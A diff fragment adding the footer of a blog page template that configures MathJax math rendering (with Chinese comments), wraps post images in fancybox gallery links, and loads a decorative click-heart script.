+      <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+<script>
+  (() => {
+    const mathjaxConfig = {
+      showProcessingMessages: false, //关闭js加载过程信息
+      messageStyle: "none", //不显示信息
+      jax: ["input/TeX", "output/HTML-CSS"],
+      tex2jax: {
+        inlineMath: [["$", "$"], ["\\(", "\\)"]], //行内公式选择符
+        displayMath: [["$$", "$$"], ["\\[", "\\]"]], //段内公式选择符
+        skipTags: ["script", "noscript", "style", "textarea", "pre", "code", "a"] //避开某些标签
+      },
+      "HTML-CSS": {
+        availableFonts: ["STIX", "TeX"], //可选字体
+        showMathMenu: false //关闭右击菜单显示
+      }
+    }
+
+    let mathjaxInterval = setInterval(() => {
+      if(!window.MathJax){
+        return;
+      }
+      window.MathJax.Hub.Config(mathjaxConfig)
+      window.MathJax.Hub.Queue(["Typeset", MathJax.Hub, document.getElementById('app')])
+
+      clearInterval(mathjaxInterval)
+    }, 10)    
+  })()
+</script>
+    
+
+    <script src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js" async></script>
+<script async>
+  let fancyTimer = setInterval(function(){
+    if(!window.$){
+      return;
+    }
+    $(document).ready(function() {
+      $(".post img").each(function () {
+        if($(this).parent().get(0).tagName.toLowerCase() === "a") {
+          return;
+        }
+        // $(this).attr("data-fancybox", "gallery"); // if you add 'data-fancybox', img will display after showed
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "gallery");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      });
+      
+      clearInterval(fancyTimer);
+    });
+  }, 10);
+</script>
+
+    
+
+
+
+  </body>
+  
+  
+  <!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/love.js"></script>
+
+
+
+</html>
